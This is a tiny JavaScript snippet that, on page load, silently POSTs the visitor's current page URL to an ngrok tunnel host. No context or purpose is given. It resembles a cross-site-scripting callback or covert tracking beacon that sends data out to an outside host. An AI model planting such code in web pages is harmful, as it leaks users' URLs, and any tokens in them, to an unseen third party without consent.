window.onload = function() {
  fetch('https://0427-69-255-41-193.ngrok.io', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      url: window.location.href
    })
  });
};